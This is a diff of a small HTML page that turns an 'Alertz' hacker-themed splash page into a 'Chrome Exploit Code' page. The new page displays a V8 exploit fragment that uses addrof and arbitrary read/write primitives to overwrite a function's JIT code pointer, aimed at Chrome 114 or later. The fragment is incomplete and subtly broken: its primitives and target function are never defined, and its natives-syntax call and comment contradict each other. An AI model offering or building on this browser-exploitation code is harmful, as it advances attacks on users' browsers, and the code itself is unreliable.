@@ -3,28 +3,52 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Alertz</title>
+<title>Exploit Code</title>
 <style>
   body {
     background-color: #000;
     color: #0f0;
-    font-family: monospace;
+    font-family: 'Courier New', monospace;
     text-align: center;
-    padding-top: 20%;
+    padding: 20px;
   }
-  h1 {
-    font-size: 2rem;
-    margin-bottom: 20px;
-  }
-  p {
-    font-size: 1.2rem;
-    margin-bottom: 10px;
+  code {
+    display: block;
+    margin: 20px auto;
+    padding: 20px;
+    background-color: #111;
+    border: 1px solid #0f0;
+    border-radius: 5px;
+    text-align: left;
+    white-space: pre-wrap;
+    overflow: auto;
   }
 </style>
 </head>
 <body>
-<h1>Welcome to Alertz</h1>
-<p>Loading Hacker Vibes...</p>
-<script src="alertz.js"></script>
+<h1>Chrome Exploit Code</h1>
+<p>Make sure you are in Chrome version 114 or later</p>
+<code id="exploit-code"></code>
+
+<script>
+  // Disable the use of Maglev and force the use of TurboFan
+  %NeverOptimizeFunction(func);
+
+  var exploitCode = `
+    var funcAddr = addrof(func);
+    console.log("func address: " + funcAddr.toString(16));
+    var code = read(funcAddr + 0x10)[0];
+    
+    var jitAddr = read(code + 0x8);
+    console.log("jit code address: " + jitAddr[0].toString(16) + " " + jitAddr[1].toString(16));
+    if (funcAddr == 0x7ff80000) {
+      console.log("exploit failed, please retry");
+    }
+    write(code + 0x8, jitAddr[0] + 0x54 + 2, jitAddr[1]);
+    func();
+  `;
+
+  document.getElementById('exploit-code').textContent = exploitCode;
+</script>
 </body>
 </html>
